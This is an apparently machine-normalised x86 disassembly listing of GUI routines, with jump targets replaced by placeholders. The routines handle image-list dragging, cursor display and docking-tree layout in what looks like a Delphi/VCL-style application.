mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_450c50
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_450e80
push ebx
mov ebx eax
mov eax ebx
call sub_455bf0
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_450ea4
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_455bf0
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_450c50
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_450f18
push ebx
push esi
mov esi eax
mov eax esi
call sub_455bf0
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_450e80
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_450da4
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_450f60
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44b008
mov dl 0x1
mov eax [ r-xdata ]
call sub_424104
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_4476d0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_450fbc
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44b12c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_45100c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_424450
xor eax eax
push ebp
push sub_4510aa
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov edx ebx
call sub_424934
xor eax eax
push ebp
push sub_451087
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_4476e8
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45108e
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_424934
retn
sub_4510bc
push ebx
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_451150
test al al
je r-xdata
mov ebx [ ebx + 0xc ]
sub_4510d8
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
cmp [ edx + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_451150
push ebx
push esi
mov edx [ eax + 0x4 ]
test edx edx
je r-xdata
mov bl 0x1
call sub_451748
mov esi eax
test esi esi
je r-xdata
mov bl [ edx + 0x57 ]
jmp r-xdata
xor ebx ebx
mov eax esi
call sub_451150
test al al
jne r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov esi [ esi + 0xc ]
test esi esi
jne r-xdata
sub_451184
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_451214
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
mov edx 0x2
call sub_451214
jmp r-xdata
retn
sub_4511cc
mov edx [ eax + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov edx [ eax + 0x14 ]
mov edx eax
jmp r-xdata
cmp cl 0x2
jne r-xdata
mov edx 0x1
call sub_451280
retn
mov cl [ edx + 0x10 ]
cmp cl 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
mov edx 0x2
call sub_451280
jmp r-xdata
retn
sub_451214
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov esi eax
mov eax esi
jmp r-xdata
mov edx [ esi + 0x1c ]
cmp eax [ edx + 0x64 ]
jne r-xdata
mov ecx edi
mov edx [ eax + 0x14 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ esi + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
dec al
je r-xdata
mov eax edx
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ esp + 0x4 ]
jmp r-xdata
dec al
jne r-xdata
mov eax [ eax + 0x18 ]
call sub_451648
jmp r-xdata
add esp 0x10
pop edi
pop esi
retn
xor eax eax
mov eax [ esp ]
jmp r-xdata
sub_451280
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi edx
mov ebx eax
mov eax [ ebx + 0x1c ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov eax edi
cmp al 0x1
jne r-xdata
mov eax [ ebx + 0x1c ]
mov esi [ eax + 0x64 ]
cmp esi [ ebx + 0x14 ]
jne r-xdata
mov eax [ esp + 0x8 ]
sub eax [ esp ]
jmp r-xdata
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
jmp r-xdata
mov esi ebx
jmp r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x1c ]
cmp esi [ eax + 0x64 ]
jne r-xdata
mov eax esi
call sub_451134
dec eax
jne r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
cmp dl [ eax + 0x10 ]
jne r-xdata
mov ecx edi
mov eax [ ebx + 0x1c ]
mov edx [ eax + 0x64 ]
cmp cl [ edx + 0x10 ]
jne r-xdata
mov esi eax
mov eax esi
call sub_451648
push eax
mov eax esi
call sub_451184
pop edx
xchg edx eax
sub eax edx
jmp r-xdata
mov eax edx
call sub_451648
mov eax [ eax + 0x68 ]
jmp r-xdata
sub_451330
push ebx
push esi
push edi
mov esi eax
mov eax esi
call sub_451134
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov eax esi
call sub_451748
mov ebx eax
mov al [ esi + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax esi
call sub_451280
mov edi eax
jmp r-xdata
dec al
je r-xdata
mov eax esi
call sub_451134
push eax
mov eax edi
pop edx
mov ecx edx
cdq
idiv ecx
mov esi eax
test ebx ebx
je r-xdata
mov edx 0x2
mov eax esi
call sub_451280
mov edi eax
jmp r-xdata
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
xor edi edi
mov eax ebx
call sub_451184
mov edx eax
add edx esi
mov eax ebx
call sub_451670
mov edx edi
mov eax ebx
call sub_451670
jmp r-xdata
mov eax ebx
call sub_4514d0
mov eax ebx
call sub_451720
mov ebx eax
test ebx ebx
jne r-xdata
sub_4513d8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
call sub_404008
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_40405c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b84c
call sub_403a44
sub_45141c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x14 ]
mov si 0xffb9
call sub_40348c
cmp [ ebp - 0x8 ] 0x0
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov [ eax + 0x38 ] ebx
xor eax eax
push ebp
push sub_45148d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_4497f4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_4514a0
push ebp
mov ebp esp
push ebx
push esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x14 ]
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
mov eax esi
call sub_451720
test eax eax
je r-xdata
mov esi [ esi + 0x14 ]
test esi esi
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_4514d0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp [ edx + 0x6c ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
mov [ eax + 0x9c ] dl
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_451280
mov ebx eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_451280
mov esi eax
push ebp
call sub_4514a0
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_451720
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub ebx [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
sub esi [ eax + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
push esi
lea eax [ ebp - 0x14 ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_451214
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_451214
mov ecx ebx
pop edx
call sub_416cfc
lea ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4484b4
mov eax [ ebp - 0x4 ]
call sub_451648
mov edi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_451648
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
call sub_451648
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_451648
push ebx
mov ebx eax
mov eax ebx
call sub_451150
test al al
jne r-xdata
mov eax [ ebx + 0x20 ]
pop ebx
retn
mov eax ebx
call sub_4510d8
test al al
je r-xdata
mov eax ebx
call sub_451184
pop ebx
retn
sub_451684
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_451670
mov ebx [ ebx + 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_451120
test eax eax
jle r-xdata
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_451674
mov edx esi
call sub_451684
sub_4516c0
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_451648
mov edi eax
mov eax ebx
call sub_451184
cmp edi eax
jl r-xdata
mov eax esi
call sub_451330
mov eax [ esi + 0x1c ]
push eax
push sub_4531d0
mov edx esi
call sub_4519fc
mov eax ebx
call sub_451648
mov edi eax
mov eax esi
call sub_4511cc
cmp edi eax
jle r-xdata
mov eax ebx
call sub_4516c0
mov ebx [ ebx + 0xc ]
test ebx ebx
jne r-xdata
sub_45172c
push ebx
mov ebx [ eax + 0x18 ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_451150
test al al
je r-xdata
mov ebx [ ebx + 0x18 ]
sub_451754
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403260
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
mov al [ eax + 0x5b ]
cmp al 0x1
je r-xdata
add esp 0xfffffff0
call sub_4035dc
xor eax eax
jmp r-xdata
cmp al 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4510fc
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423e0c
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edx 0xffffff
xor eax eax
call sub_429098
mov edx eax
mov eax ebx
call sub_423f88
mov eax [ ebp - 0x4 ]
call sub_451924
xor eax eax
push ebp
push sub_451860
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_44c00c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_451330
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_451867
mov eax [ ebp - 0x4 ]
call sub_451928
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_44bfd0
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_451867
mov eax [ ebp - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x38 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x3c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x3c ] edx
mov [ eax + 0x38 ] sub_4536f8
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_4518bc
push ebx
push esi
call sub_403644
mov ebx edx
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov edx [ esi + 0x64 ]
mov eax esi
call sub_452928
mov eax [ esi + 0x10 ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
mov eax [ esi + 0x14 ]
mov edx [ esi + 0x30 ]
mov [ eax + 0x38 ] edx
mov edx [ esi + 0x34 ]
mov [ eax + 0x3c ] edx
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_40362c
sub_45193c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] ebx
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
pop ebx
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0xc ]
call sub_45193c
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x8 ]
call sub_45193c
pop ecx
sub_451994
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] edx
xor edx edx
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ eax + 0x64 ]
call sub_45193c
pop ecx
sub_4519c0
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
lea esi [ eax + 0x8 ]
mov edx ebx
mov eax [ esi + 0x4 ]
call [ esi ]
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_4519c0
pop ecx
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_4519c0
pop ecx
sub_451a14
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
call sub_451994
mov ebx eax
test ebx ebx
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_451280
push eax
lea eax [ esp + 0x4 ]
push eax
mov edx 0x2
mov eax ebx
call sub_451280
push eax
mov edx 0x1
mov eax ebx
call sub_451214
push eax
mov edx 0x2
mov eax ebx
call sub_451214
pop edx
pop ecx
call sub_416cfc
mov edi esi
mov esi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402ca4
jmp r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_451a98
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ eax + 0x4 ] esi
call sub_4514d0
jmp r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x20 ]
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov [ ebp - 0x1 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
mov ecx edi
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x20 ]
call sub_416cfc
push esi
lea esi [ ebp - 0x30 ]
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax ebx
mov edi [ eax ]
call [ edi ]
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_4484b4
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4510fc
mov edx [ ebx + 0x64 ]
mov [ edx + 0x8 ] eax
mov [ eax + 0x14 ] edx
mov [ eax + 0x4 ] esi
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_451994
mov [ ebp - 0x8 ] eax
xor eax eax
mov al [ ebp - 0x1 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x64 ]
call sub_451120
dec eax
jne r-xdata
mov edx eax
mov eax ebx
call sub_4529c0
mov edx esi
mov eax ebx
call sub_451994
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax esi
call sub_448a98
mov edi eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4510fc
mov [ eax + 0x4 ] esi
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov edi [ ebx + 0x64 ]
mov al [ ebp - 0x9 ]
mov [ edi + 0x10 ] al
mov al [ ebp - 0x9 ]
dec al
je r-xdata
mov eax esi
call sub_448a84
mov [ ebp - 0x10 ] eax
mov edx [ ebx + 0x64 ]
mov dl [ edx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x14 ]
mov dl [ edx + 0x10 ]
jmp r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x2
call sub_451280
mov edx eax
mov eax edi
call sub_451670
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x1
call sub_451280
mov [ ebx + 0x68 ] eax
jmp r-xdata
dec al
je r-xdata
cmp dl [ ebp - 0x9 ]
jne r-xdata
mov [ ebp - 0x9 ] dl
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
mov edx 0x1
call sub_451280
mov edx eax
mov eax edi
call sub_451670
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
mov edx 0x2
call sub_451280
mov [ ebx + 0x68 ] eax
jmp r-xdata
mov dl [ ebp - 0x9 ]
push edx
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_451ca8
xor edx edx
mov dl [ ebp - 0x1 ]
mov dl [ edx + rw-data ]
push edx
mov ecx [ ebp - 0x8 ]
mov edx eax
mov eax ebx
call sub_451e50
jmp r-xdata
sub_451ca8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4510fc
mov ebx eax
mov al [ ebp + 0xc ]
mov [ ebx + 0x10 ] al
test edi edi
jne r-xdata
mov eax edi
call sub_451648
mov edx eax
mov eax ebx
call sub_451670
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_451670
mov eax [ esi + 0x64 ]
call sub_451648
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_452d18
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4519fc
mov eax [ esi + 0x64 ]
call sub_451648
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_452d18
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4519fc
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_45309c
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_4519fc
mov eax [ esi + 0x64 ]
call sub_451648
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_4531d0
xor edx edx
mov eax esi
call sub_4519fc
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_451670
adc edx 0x0
mov eax ebx
call sub_451330
mov eax ebx
call sub_4516c0
push esi
push sub_4531d0
xor edx edx
mov eax esi
call sub_4519fc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_451e50
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
